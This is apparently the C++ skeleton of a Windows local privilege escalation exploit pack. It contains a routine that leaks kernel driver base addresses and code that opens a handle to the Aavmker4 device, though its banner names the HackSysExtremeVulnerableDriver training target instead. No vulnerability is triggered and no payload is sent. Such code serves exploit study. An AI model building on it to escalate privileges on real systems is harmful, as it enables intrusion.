#include "common.h"



DWORD GetModuleImageBase(const wstring &imageNameParam) {

	static const size_t Max_Number_Of_Modules = 1000;
	static const wstring ending(L".sys");	

	wstring imageName(imageNameParam);
	transform(imageName.begin(), imageName.end(), imageName.begin(), ::tolower);
	
	if(!equal(ending.rbegin(), ending.rend(), imageName.rbegin())) {
		imageName += ending;
	}
	
	shared_ptr<RTL_PROCESS_MODULES> modulesInfo(
		new RTL_PROCESS_MODULES[Max_Number_Of_Modules]
	);
	
	if(!modulesInfo.get()) {
		wcerr << L"[!] Could not allocate memory for modulesInfo!" << endl;
		return 0;
	}
	
	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 
		modulesInfo.get(), 
		sizeof(RTL_PROCESS_MODULES) * Max_Number_Of_Modules, 
		NULL
	);
	
	if(!NT_SUCCESS(status)) {
		wcerr << L"[!] Could not obtain list of loaded driver modules! Status: 0x" 
			<< hex << setfill(L'0') << setw(8) << status << endl;
		return 0;
	}
	
	for(size_t i = 0; i < modulesInfo->NumberOfModules; i++ ) {
		
		const DWORD imageBase = modulesInfo->Modules[i].ImageBase;
		const char *moduleImageNamePointer = reinterpret_cast<const char*>(
			modulesInfo->Modules[i].FullPathName 
			+ modulesInfo->Modules[i].OffsetToFileName);
			
		const string moduleImageName(moduleImageNamePointer);

		wstring moduleImageNameWide(moduleImageName.begin(), moduleImageName.end());
		transform(
			moduleImageNameWide.begin(), 
			moduleImageNameWide.end(), 
			moduleImageNameWide.begin(), 
			::tolower);
			
		if(imageName == moduleImageNameWide) {
			wcout << L"[+] Found " << imageName << L" driver's base: 0x" 
				<< hex << setfill(L'0') << setw(8) << imageBase << endl;
			return imageBase;
		}
	}
	
	wcerr << L"[!] Could not find the " << imageName 
		<< L" module among the loaded modules." << endl;
	
	return 0;
}


int main(int argc, char** argv) {
	
	wcout << L"HackSysExtremeVulnerableDriver" << endl;
	wcout << L"Local Privilege Escalation exploit's pack'" << endl;
	wcout << L"Mariusz B. / mgeeky, '17" << endl << endl;
	
	shared_ptr<HANDLE> driverHandle(new HANDLE(
		CreateFileW(
			L"\\\\.\\Aavmker4", 
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
			NULL
	)),
	[](const HANDLE *ptr) {
		if( *ptr != (HANDLE)INVALID_HANDLE_VALUE && ptr != nullptr) {
			CloseHandle(*ptr);
		}
		delete ptr;
	});
	
	if( *driverHandle == static_cast<HANDLE>(INVALID_HANDLE_VALUE)) {
		wcerr << L"[!] Could not open \\Device\\Aavmker4 driver's handle. Error: 0x" 
			<< GetLastError() << endl;
		return 1;
	}

	
	return 0;
}
